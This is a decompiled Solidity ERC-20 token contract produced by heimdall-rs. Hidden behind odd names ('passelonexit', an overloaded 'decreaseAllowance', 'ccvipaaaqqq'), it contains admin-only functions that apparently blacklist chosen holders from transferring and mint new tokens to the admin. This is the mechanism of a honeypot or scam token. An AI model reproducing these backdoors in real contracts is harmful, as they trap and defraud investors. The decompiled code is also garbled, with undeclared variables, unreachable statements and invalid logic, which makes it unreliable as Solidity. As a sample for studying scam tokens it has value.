// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 18;
    
    mapping(bytes32 => bytes32) storage_map_h;
    bytes32 store_a;
    address public vipadmin123;
    mapping(bytes32 => bytes32) storage_map_b;
    address public owner;
    bytes32 store_i;
    uint256 public totalSupply;
    bytes32 store_f;
    uint256 public infonum;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    event OwnershipTransferred(address, address);
    
    /// @custom:selector    0x06fdde03
    /// @custom:signature   name() public view returns (string memory)
    function name() public view returns (string memory) {
        if (store_a) {
            if (store_a - ((store_a >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_a >> 0x01;
                if (store_a) {
                    if (store_a - ((store_a >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_a >> 0x01) {
                            if (0x1f < (store_a >> 0x01)) {
                                var_a = 0x04;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_a >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xbc4c851c
    /// @custom:signature   passelonexit(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function passelonexit(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(msg.sender) == (address(vipadmin123)));
        address var_a = address(arg0);
        var_b = 0x08;
        storage_map_b[var_a] = 0;
    }
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x08;
        require(infonum - storage_map_b[var_a], "ERC20: transfer amount exceeds balance");
        require(address(msg.sender), "ERC20: transfer amount exceeds balance");
        require(address(arg0), "ERC20: transfer amount exceeds balance");
        var_a = address(msg.sender);
        var_b = 0x06;
        require(!(storage_map_b[var_a] < arg1), "ERC20: transfer amount exceeds balance");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x26;
        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;
        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;
        var_a = address(msg.sender);
        var_b = 0x06;
        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), "ERC20: transfer to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_h = 0x11;
        var_a = address(msg.sender);
        var_b = 0x06;
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        var_a = address(arg0);
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: transfer to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_h = 0x11;
        var_a = address(arg0);
        var_b = 0x06;
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        uint256 var_c = arg1;
        emit Transfer(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x23;
        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;
        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x25;
        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;
        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x39509351
    /// @custom:signature   increaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1 + storage_map_b[var_a];
        uint256 var_d = arg1 + storage_map_b[var_a];
        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_b[var_a]);
        var_d = 0x01;
        return 0x01;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x22;
        var_g = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_h = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_e = 0x20;
        var_f = 0x24;
        var_g = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_h = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x80b2122e
    /// @custom:signature   decreaseAllowance(address arg0) public payable
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function decreaseAllowance(address arg0) public payable {
        require(arg0 == (address(arg0)));
        require(address(msg.sender) == (address(vipadmin123)));
        address var_a = address(arg0);
        var_b = 0x08;
        storage_map_b[var_a] = 0x2fc9;
    }
    
    /// @custom:selector    0xa457c2d7
    /// @custom:signature   decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function decreaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        address var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        require(!(storage_map_b[var_a] < arg1), "ERC20: decreased allowance below zero");
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x25;
        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;
        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;
        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), "ERC20: approve to the zero address");
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_h = 0x11;
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        var_b = keccak256(var_a);
        storage_map_b[var_a] = storage_map_b[var_a] - arg1;
        uint256 var_c = storage_map_b[var_a] - arg1;
        emit Approval(address(msg.sender), address(arg0), storage_map_b[var_a] - arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   Unresolved_23b872dd(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_23b872dd(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x06;
        address var_c = storage_map_b[var_a];
        return storage_map_b[var_a];
    }
    
    /// @custom:selector    0x5a49db78
    /// @custom:signature   ccvipaaaqqq() public payable
    function ccvipaaaqqq() public payable {
        address var_a = msg.sender;
        var_b = 0x06;
        require(!storage_map_b[var_a] > (store_f + storage_map_b[var_a]));
        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
        var_c = 0x11;
        storage_map_b[var_a] = store_f + storage_map_b[var_a];
        require(address(msg.sender) == (address(vipadmin123)));
    }
    
    /// @custom:selector    0x24119c0c
    /// @custom:signature   xelonlist(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function xelonlist(address arg0) public view returns (uint256) {
        require(arg0 == (address(arg0)));
        var_a = 0x08;
        address var_b = arg0;
        address var_c = storage_map_h[var_b];
        return storage_map_h[var_b];
    }
    
    /// @custom:selector    0x95d89b41
    /// @custom:signature   symbol() public view returns (string memory)
    function symbol() public view returns (string memory) {
        if (store_i) {
            if (store_i - ((store_i >> 0x01) < 0x20)) {
                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                var_b = 0x22;
                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));
                bytes32 var_d = store_i >> 0x01;
                if (store_i) {
                    if (store_i - ((store_i >> 0x01) < 0x20)) {
                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;
                        var_b = 0x22;
                        if (!store_i >> 0x01) {
                            if (0x1f < (store_i >> 0x01)) {
                                var_a = 0x05;
                                var_e = storage_map_b[var_a];
                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {
                                    var_e = 0x20;
                                    uint256 var_f = var_c.length;
                                    uint256 var_g = 0;
                                    return abi.encodePacked(0x20, var_c.length);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   Unresolved_dd62ed3e(address arg0) public pure
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function Unresolved_dd62ed3e(address arg0) public pure {
        require(arg0 == (address(arg0)));
    }
    
    /// @custom:selector    0x715018a6
    /// @custom:signature   renounceOwnership() public payable
    function renounceOwnership() public payable {
        require(msg.sender == (address(owner)), "Ownable: caller is not the owner");
        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_b = 0x20;
        var_c = 0x20;
        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;
        owner = 0 | (uint96(owner));
        emit OwnershipTransferred(address(owner), 0);
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        require(arg0 == (address(arg0)));
        require(address(msg.sender), "ERC20: approve to the zero address");
        require(address(arg0), "ERC20: approve to the zero address");
        address var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_b[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x22;
        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;
        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;
        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;
        var_d = 0x20;
        var_e = 0x24;
        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;
        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;
    }
}